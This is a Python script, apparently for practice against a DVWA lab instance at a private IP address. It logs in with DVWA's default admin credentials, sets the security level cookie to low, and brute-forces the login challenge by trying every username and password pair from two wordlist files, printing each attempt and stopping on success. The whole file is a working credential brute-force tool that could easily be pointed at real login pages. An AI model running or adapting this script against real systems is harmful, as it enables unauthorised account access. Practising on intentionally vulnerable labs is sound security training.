#!/usr/bin/python3

import requests
from bs4 import BeautifulSoup
import argparse
from urllib.parse import urlparse

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class Login():

    def __init__(self):
        self.url='http://172.16.16.129/dvwa'
        self.username='admin'
        self.password='password'
        self.submit='Login'
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0'
        }
        self.headers=headers

        self.logon()
        self.bruteforce()


    def logon(self):
        #Need cookie
        self.cookies = requests.session().get(self.url+'/login.php').cookies.get_dict()
        self.cookies['security'] = 'low'
        print (self.cookies)
        
        data = {
            'username' : self.username,
            'password' : self.password,
            'Login' : self.submit,
        }
        r = requests.post(self.url+'/login.php', data = data, cookies=self.cookies, headers=self.headers)
        # print(r.text)
    
    def bruteforce(self):
        userlist=self.getdata('users.txt')
        passlist=self.getdata('passwords.txt')

        for u  in userlist:
            for p in passlist:
                self.username=u.decode('utf-8')
                self.password=p.decode('utf-8')
                data = {
                    'username' : self.username,
                    'password' : self.password,
                    'Login' : 'Login',
                }
                r = requests.get(self.url+'/vulnerabilities/brute/', params = data, cookies=self.cookies, headers=self.headers)
                soup = BeautifulSoup(r.text, 'html.parser')
                # failed = soup.find("pre").find(text=True)
                failed = soup.find("pre")
                if (failed == None):
                    print(f'{bcolors.OKGREEN} {self.username}:{self.password}{bcolors.ENDC}')
                    exit()
                else:
                    print(f'{bcolors.FAIL} {self.username}:{self.password}{bcolors.ENDC}')


    @staticmethod
    def getdata(path):
        with open(path, 'rb+') as f:
            data = ([line.rstrip() for line in f])
            f.close()
        return data

# class Bruteforce():


login = Login()



